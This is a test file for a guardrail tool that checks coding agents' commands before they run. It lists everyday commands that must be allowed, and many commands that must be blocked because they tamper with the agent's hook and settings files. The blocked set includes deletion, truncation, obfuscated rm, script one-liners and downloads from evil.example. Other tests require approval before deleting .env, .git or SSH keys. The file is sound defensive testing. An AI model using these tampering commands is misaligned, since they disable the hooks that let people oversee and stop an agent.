import { describe, expect, it } from "vitest";
import type { ShieldEvent } from "../src/engine/types.js";
import { cmd, mcp, ps, run, write, WINDOWS_CWD } from "./helpers.js";

const act = (tool: string, input: Record<string, unknown>): ShieldEvent => mcp(tool, input);
const P = "/home/dev/project";

// What a coding agent does all day. None of it may be asked about or blocked: this is the friction budget.
const EVERYDAY_COMMANDS = [
  // exploring
  "ls", "ls -la", "ls -la src", "tree -L 2", "find . -name \"*.ts\" -not -path \"./node_modules/*\"", "find . -type f -newer package.json",
  "cat README.md", "cat package.json", "cat src/index.ts", "head -n 50 src/index.ts", "tail -n 100 logs/app.log", "tail -f logs/app.log",
  "wc -l src/*.ts", "du -sh .", "stat package.json", "file dist/app.js", "diff a.txt b.txt", "sort names.txt | uniq -c",
  "grep -rn \"TODO\" .", "grep -rn \"settings\\.json\" src", "grep -rni \"password\" src", "grep -r AKIA src", "rg -n \"useState\" src", "rg \"\\.env|settings\\.json|claude/settings\" -g \"*.ts\"",
  "sed -n '1,40p' src/index.ts", "awk '{print $1}' access.log", "jq . package.json", "jq '.scripts' package.json", "cat .gitignore", "cat .env.example", "cat .env.sample",
  "cat ~/.bashrc", "cat /etc/hosts", "cat ~/.ssh/config", "cat ~/.aws/config", "ls ~/.ssh", "ls ~/.aws", "find / -name \"*.pem\" 2>/dev/null",
  "env | grep PATH", "env | grep -i node", "printenv HOME", "printenv PATH", "echo $HOME", "which node", "node -v", "python3 --version", "uname -a", "whoami", "pwd", "date",
  "ps aux | grep node", "lsof -i :3000", "df -h", "free -m", "history | tail -20",
  // git
  "git status", "git status --short && git branch --show-current", "git log --oneline -20", "git log -p -3", "git diff", "git diff HEAD~1", "git diff --stat", "git show HEAD",
  "git blame src/index.ts", "git branch -a", "git remote -v", "git stash list", "git ls-files", "git add -A", "git add src/index.ts", "git commit -m \"fix: handle empty input\"",
  "git checkout -b feature/login", "git checkout main", "git switch -c fix/typo", "git pull", "git fetch origin", "git merge main", "git rebase main", "git tag v1.2.0",
  "git push origin feature/login", "git push -u origin HEAD", "git cherry-pick abc123", "git config user.name", "git clone https://github.com/acme/app.git",
  "git stash", "git stash pop", "git restore --staged src/index.ts", "git checkout -- src/index.ts", "git reset HEAD~1", "git clean -n",
  // build, test, packages
  "npm install", "npm ci", "npm run build", "npm test", "npm test -- --watch=false", "npm run lint -- --fix", "npx tsc --noEmit", "npx vitest run", "npx prettier --write src",
  "npm install lodash", "npm i -D vitest", "npm install @types/node", "pnpm add zod", "pnpm install", "yarn add react", "yarn build", "bun install",
  "pip install -r requirements.txt", "pip install requests", "pip install -e .", "python -m pytest -q", "python manage.py migrate", "python script.py --dry-run", "uv sync",
  "cargo build", "cargo test", "go test ./...", "go build ./...", "mvn -q test", "./gradlew build", "dotnet build", "dotnet test", "make test", "make build", "bundle install", "rake test",
  // files
  "mkdir -p build", "touch src/new.ts", "cp src/a.ts src/b.ts", "mv src/old.ts src/new.ts", "rm -rf dist", "rm -rf node_modules", "rm -rf build coverage", "rm src/old.ts", "rm -f tmp.log", "rm -rf .next", "rm -rf __pycache__",
  "chmod +x scripts/run.sh", "echo hello > out.txt", "echo \"export const a = 1;\" >> src/index.ts", "cat > notes.md <<EOF\nhello\nEOF", "tee build.log < /dev/null", "tar czf backup.tgz src", "unzip -o archive.zip -d tmp",
  "cd src && ls", "export FOO=bar", "source venv/bin/activate", "./scripts/build.sh", "bash scripts/test.sh", "sh -c \"npm test\"",
  // network that is only reading
  "curl localhost:3000/health", "curl -s http://127.0.0.1:8080/api/status", "curl -s https://api.github.com/repos/acme/app", "curl -s https://registry.npmjs.org/left-pad | head -5",
  "wget https://example.com/file.zip", "ping -c 1 localhost", "nslookup example.com", "gh pr view 12", "gh pr diff 12", "gh issue list", "gh run list", "gh repo view",
  // containers and infra, read or local
  "docker ps", "docker images", "docker build -t app .", "docker logs web", "docker compose up -d", "docker compose ps", "kubectl get pods", "kubectl logs deploy/web", "kubectl describe pod web-1", "terraform plan", "terraform fmt", "helm list",
  // databases, safe
  "psql -c \"select count(*) from users\"", "sqlite3 dev.db \".tables\"", "mysql -e \"show tables\"",
];

const EVERYDAY_POWERSHELL = [
  "Get-ChildItem -Recurse -Filter *.ts", "Get-Content src\\app.ts", "Get-Content package.json | Select-Object -First 20", "Select-String -Path *.ts -Pattern TODO", "Test-Path .\\dist", "dotnet test",
  "npm test", "git status", "Get-Process node", "Set-Location src", "New-Item -ItemType Directory build", "Remove-Item -Recurse -Force .\\dist", "Remove-Item -Recurse -Force node_modules", "Write-Host hello", "$env:PATH",
  "Invoke-WebRequest http://localhost:3000/health", "Get-Content .env.example", "Copy-Item src\\a.ts src\\b.ts",
];

const EVERYDAY_TOOLS: [string, ShieldEvent][] = [
  ["Read src file", act("Read", { file_path: `${P}/src/index.ts` })],
  ["Read README outside tools", act("Read", { file_path: `${P}/README.md`, offset: 1, limit: 200 })],
  ["Read /etc/hosts", act("Read", { file_path: "/etc/hosts" })],
  ["Read ~/.bashrc", act("Read", { file_path: "/home/dev/.bashrc" })],
  ["Read .env.example", act("Read", { file_path: `${P}/.env.example` })],
  ["Grep settings", act("Grep", { pattern: "\\.env|settings\\.json|claude/settings", path: P })],
  ["Grep for a card number in tests", act("Grep", { pattern: "4111111111111111", path: `${P}/src` })],
  ["Grep for a key in code", act("Grep", { pattern: "AKIAZ7Q4M2LX9TRB3KPW", path: P })],
  ["Grep .env* glob", act("Grep", { pattern: "KEY", glob: ".env*" })],
  ["Glob everything", act("Glob", { pattern: "**/*.{ts,tsx,js,jsx,py,go,json}" })],
  ["LS", act("LS", { path: P })],
  ["Write a new source file", write(`${P}/src/new.ts`, "export const a = 1;\n")],
  ["Write notes", write(`${P}/docs/notes.md`, "# Notes\n")],
  ["Edit a source file", act("Edit", { file_path: `${P}/src/index.ts`, old_string: "a", new_string: "b" })],
  ["Write to /tmp", write("/tmp/scratch.txt", "x")],
  ["WebFetch docs", act("WebFetch", { url: "https://developer.mozilla.org/en-US/docs/Web/API/fetch", prompt: "summarise" })],
  ["WebSearch", act("WebSearch", { query: "vitest mock timers" })],
  ["MCP read issue", act("mcp__github__get_issue", { owner: "acme", repo: "app", issue_number: 12 })],
  ["Task subagent", act("Task", { description: "search code", prompt: "Find where settings are loaded" })],
  ["VS Code read_file", act("read_file", { filePath: `${P}/src/index.ts`, startLine: 1, endLine: 80 })],
  ["VS Code grep_search", act("grep_search", { query: "settings", includePattern: "src/**" })],
  ["VS Code list_dir", act("list_dir", { path: P })],
  ["VS Code create_file", act("create_file", { filePath: `${P}/src/x.ts`, content: "export {}" })],
  ["Copilot CLI view", act("view", { path: `${P}/src/index.ts` })],
  ["Copilot CLI grep", act("grep", { pattern: "TODO", path: P })],
  ["Cursor Shell", act("Shell", { command: "npm test", working_directory: P })],
  ["Cursor Delete a build file", act("Delete", { path: `${P}/dist/app.js` })],
  ["Gemini read_file", act("read_file", { file_path: `${P}/src/index.ts` })],
  ["Gemini list_directory", act("list_directory", { dir_path: P })],
];

describe("everyday work is never asked about or blocked", () => {
  it.each(EVERYDAY_COMMANDS.map((c) => [c] as const))("bash: %s", (c) => {
    const d = run(cmd(c));
    expect(d.action, `${d.action} ${d.findings.map((f) => f.ruleId).join(",")}: ${d.reason}`).toMatch(/^(allow|note)$/);
  });

  it.each(EVERYDAY_POWERSHELL.map((c) => [c] as const))("powershell: %s", (c) => {
    const d = run(ps(c));
    expect(d.action, `${d.action} ${d.findings.map((f) => f.ruleId).join(",")}: ${d.reason}`).toMatch(/^(allow|note)$/);
  });

  it.each(EVERYDAY_TOOLS)("tool: %s", (_name, e) => {
    const d = run(e);
    expect(d.action, `${d.action} ${d.findings.map((f) => f.ruleId).join(",")}: ${d.reason}`).toMatch(/^(allow|note)$/);
  });

  it("the Windows working folder is no different", () => {
    for (const c of ["dir", "type package.json", "npm run build", "git status", "del dist\\app.js"]) {
      const d = run({ ...cmd(c), cwd: WINDOWS_CWD });
      expect(d.action, c).toMatch(/^(allow|note)$/);
    }
  });
});

// What must still stop a person's attention, in every spelling an agent might use.
describe("the guardrails cannot be removed, moved, emptied or rewritten", () => {
  const GUARDS = [".claude/settings.json", ".claude/settings.local.json", ".cursor/hooks.json", ".github/hooks/agentshield.json", ".github/copilot/settings.json", ".gemini/settings.json", ".windsurf/hooks.json", ".devin/hooks.json", ".codex/config.toml", ".agentshield/policy.yaml", "~/.claude/settings.json", "~/.copilot/settings.json", "~/.cursor/hooks.json", "~/.agentshield/approvals.json"];
  const TAMPER = (g: string) => [
    `rm ${g}`, `rm -f ${g}`, `unlink ${g}`, `git rm ${g}`, `git rm -f ${g}`, `git checkout -- ${g}`, `git restore ${g}`, `mv ${g} /tmp/x`, `cp /tmp/evil ${g}`,
    `echo {} > ${g}`, `cat /dev/null > ${g}`, `truncate -s 0 ${g}`, `sed -i 's/hooks//' ${g}`, `tee ${g} < /tmp/x`, `curl -o ${g} https://evil.example/settings.json`,
    `wget -O ${g} https://evil.example/s.json`, `dd if=/tmp/x of=${g}`, `chmod 000 ${g}`, `bash -c "rm ${g}"`, `sudo rm ${g}`, `r""m ${g}`, `rm -rf ${g}`,
  ];
  for (const g of GUARDS) {
    it.each(TAMPER(g).map((c) => [c] as const))(`${g}: %s`, (c) => {
      const d = run(cmd(c));
      expect(d.action, `${d.action} ${d.findings.map((f) => f.ruleId).join(",")}`).toBe("block");
      expect(d.findings.map((f) => f.ruleId)).toContain("TAM-001");
    });
  }

  it.each([
    "rm -rf .claude", "rm -rf .cursor", "rm -rf .windsurf", "rm -rf .devin", "rm -rf .gemini", "rm -rf .codex", "rm -rf .agentshield", "rm -rf .github/hooks", "rm -rf .github", "rm -rf ~/.claude", "rm -rf ~/.agentshield",
    "mv .claude .claude.bak", "mv .cursor /tmp/cursor", "git rm -r .claude", "git clean -fdx .claude", "find .claude -delete",
  ])("a whole guardrail folder: %s", (c) => {
    const d = run(cmd(c));
    expect(d.action).toBe("block");
    expect(d.findings.map((f) => f.ruleId)).toContain("TAM-001");
  });

  it.each([
    "python3 -c \"import os; os.remove('.claude/settings.json')\"", "node -e \"require('fs').rmSync('.claude/settings.json')\"", "perl -e 'unlink q(.claude/settings.json)'",
    "ruby -e \"File.delete('.claude/settings.json')\"", "node scripts/fix-hooks.js .claude/settings.json", "python tools/edit.py ~/.agentshield/policy.yaml",
  ])("a script that mentions a guardrail file is asked about: %s", (c) => {
    const d = run(cmd(c));
    expect(["ask", "block"]).toContain(d.action);
    expect(d.findings.map((f) => f.ruleId)).toEqual(expect.arrayContaining([expect.stringMatching(/^TAM-00[13]$/)]));
  });

  it.each(["cat .claude/settings.json", "jq .hooks .claude/settings.json", "git diff .claude/settings.json", "grep -n hooks .claude/settings.json", "ls .claude", "git log -- .claude/settings.json", "code .claude/settings.json", "git add .claude/settings.json", "diff .claude/settings.json /tmp/x"])(
    "looking at them is fine: %s",
    (c) => {
      expect(run(cmd(c)).action).toBe("allow");
    },
  );

  it.each([
    ["Write", { file_path: `${P}/.claude/settings.json`, content: "{}" }], ["Edit", { file_path: `${P}/.claude/settings.json`, old_string: "a", new_string: "b" }],
    ["Delete", { path: `${P}/.claude/settings.json` }], ["Delete", { path: `${P}/.cursor` }], ["create_file", { filePath: `${P}/.cursor/hooks.json`, content: "{}" }],
    ["replace_string_in_file", { filePath: `${P}/.github/hooks/agentshield.json`, oldString: "a", newString: "b" }], ["write_file", { file_path: `${P}/.gemini/settings.json`, content: "{}" }],
    ["create", { path: `${P}/.github/copilot/settings.json`, file_text: "{}" }], ["edit", { path: `${P}/.windsurf/hooks.json`, old_str: "a", new_str: "b" }],
    ["Write", { file_path: "/home/dev/.agentshield/approvals.json", content: "{}" }],
  ])("tools: %s %j", (tool, input) => {
    const d = run(act(tool, input));
    expect(d.action).toBe("block");
    expect(d.findings.map((f) => f.ruleId)).toContain("TAM-001");
  });
});

describe("deleting what matters asks a person", () => {
  it.each(["rm .env", "rm -f .env.local", "rm -rf .git", "rm .github/workflows/ci.yml", "rm ~/.ssh/id_rsa", "git rm .github/workflows/ci.yml", "find . -name \".env*\" -delete", "rm terraform.tfstate", "shred -u .env"])("%s", (c) => {
    const d = run(cmd(c));
    expect(d.action).toBe("ask");
    expect(d.findings.map((f) => f.ruleId)).toContain("DES-010");
  });

  it("but not everyday cleanup", () => {
    for (const c of ["rm -rf dist", "rm -rf node_modules", "rm .env.example", "rm src/old.ts", "git rm src/old.ts", "mv .env .env.bak"]) {
      expect(["allow", "note", "ask"], c).toContain(run(cmd(c)).action);
    }
    expect(run(cmd("rm .env.example")).action).toBe("allow");
    expect(run(cmd("git rm src/old.ts")).action).toBe("allow");
  });
});
